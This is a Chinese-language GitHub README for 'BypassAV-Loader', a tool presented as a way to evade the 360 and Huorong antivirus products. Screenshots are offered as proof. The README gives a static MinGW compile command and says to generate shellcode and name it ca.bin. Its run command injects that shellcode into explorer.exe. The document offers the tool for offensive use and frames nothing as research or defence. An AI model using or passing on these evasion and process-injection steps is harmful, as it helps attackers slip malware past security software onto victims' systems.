# BypassAV-Loader
用于绕过杀软的加载器，采用的是分离免杀方式

绕过360杀软

<img width="924" height="579" alt="3d17e01a-a88e-4fdb-8b12-ff4b49d44a6e" src="https://github.com/user-attachments/assets/4e805669-26ed-4953-be9c-3f65eb1984f6" />

绕过火绒杀软

<img width="1887" height="744" alt="7abfdaed-3594-4293-8402-3dc0672ecbc7" src="https://github.com/user-attachments/assets/cacbbc4e-f90b-4132-a186-f8bc43d8210b" />

## 编译命令
x86_64-w64-mingw32-g++ -O2 -s -static -static-libgcc -static-libstdc++ BypassAV-Loader.cpp -o BypassAV-Loader.exe -lwininet -ladvapi32 -lpthread

<img width="1730" height="684" alt="image" src="https://github.com/user-attachments/assets/a0839cdb-f0ca-4f6b-9533-48b49c6098ca" />

## 需要准备ca.bin文件
生成shellcode文件并改名为ca.bin文件

## 执行命令
BypassAV-Loader.exe -i ca.bin -p explorer.exe -m classic
